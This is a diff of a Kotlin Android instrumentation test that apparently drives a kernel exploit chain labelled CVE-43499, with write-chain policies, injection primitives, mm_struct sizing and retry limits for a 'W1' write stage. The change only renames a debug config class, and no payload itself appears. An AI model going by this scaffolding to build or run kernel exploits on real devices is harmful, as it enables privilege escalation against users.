@@ -11,7 +11,7 @@ import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499RouteGenera
 import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteGenerator
 import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499Lifecycle
 import com.ghostlock.app.backend.backends.cve43499.owned.PlacementConfig
-import com.ghostlock.app.data.cve43499.A301SoDebugConfig
+import com.ghostlock.app.backend.backends.cve43499.config.Cve43499DebugConfig
 import com.ghostlock.app.jni.Native43499ActorSetup
 import java.io.File
 import org.junit.Assert.assertTrue
@@ -154,12 +154,12 @@ class W1OnlyProbeTest {
      */
     private fun runW1Only(record: (String) -> Unit) {
         val context = InstrumentationRegistry.getInstrumentation().targetContext
-        val debug = A301SoDebugConfig.load(context)
+        val debug = Cve43499DebugConfig.load(context)
         record(
             "E1|debug_profile|release=${debug.release}|kernel_major=${debug.kernelMajor}" +
                 "|primitive=${debug.injection.primitive}|mm_struct_sz=${debug.kernelsnitch.mmStructSz}",
         )
-        val execution = A301SoDebugConfig.executionParameters(debug)
+        val execution = Cve43499DebugConfig.executionParameters(debug)
         val ghostPid = android.os.Process.myPid()
         /* task-119：实际 W1 target 进 E1 report/evidence（临时实验键可覆盖）。 */
         val w1Target = com.ghostlock.app.backend.backends.cve43499.generator.Cve43499GeneratorContext(
@@ -179,7 +179,7 @@ class W1OnlyProbeTest {
             ?: error("E1|generator 非 WriteGenerator：${debug.injection.primitive}")
         val planner = Cve43499RouteGeneratorFactory.createPlanner(debug, execution, ghostPid)
         val policy = Cve43499WriteChainPolicy.fromDebug(
-            A301SoDebugConfig.writeChainParameters(),
+            Cve43499DebugConfig.writeChainParameters(),
             debug.injection.primitive,
         )
         val allocation = execution.allocationSize
@@ -244,7 +244,7 @@ class W1OnlyProbeTest {
          * - attempt 间 250ms settle；上限 8（task-95 收紧；debug w1Attempts=15 仅为候选上限来源）；
          * - 仅 landing clean-failure 重试，其它 RouteMiss/Failed 立即 FAIL。 */
         val retryLimit = minOf(
-            maxOf(policy.w1Attempts, A301SoDebugConfig.writeChainParameters().w1Attempts),
+            maxOf(policy.w1Attempts, Cve43499DebugConfig.writeChainParameters().w1Attempts),
             8,
         )
         var attempt = 0
